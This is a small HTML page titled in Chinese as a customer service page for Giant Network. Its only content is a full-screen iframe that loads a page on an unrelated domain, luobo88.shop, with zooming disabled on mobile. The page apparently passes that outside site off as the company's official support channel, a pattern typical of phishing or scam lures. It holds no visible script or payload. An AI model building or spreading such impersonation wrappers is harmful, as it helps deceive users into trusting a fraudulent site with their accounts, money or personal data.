<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <!-- 核心：移动端视口适配标签，解决手机端缩放/尺寸错乱 -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <title>巨人网络客服页面</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html, body {
            width: 100%;
            height: 100%;
            /* 取消全局禁止滚动，交给iframe内部滚动 */
            overflow: hidden;
        }
        #target-site {
            width: 100%;
            height: 100vh;
            border: none;
            display: block;
            /* 允许iframe内部内容滚动 */
            overflow: auto;
            /* 解决部分浏览器iframe缩放偏差 */
            transform: translateZ(0);
        }
    </style>
</head>
<body>
    <iframe id="target-site" src="https://www.luobo88.shop/asdfgh"></iframe>
</body>
</html>
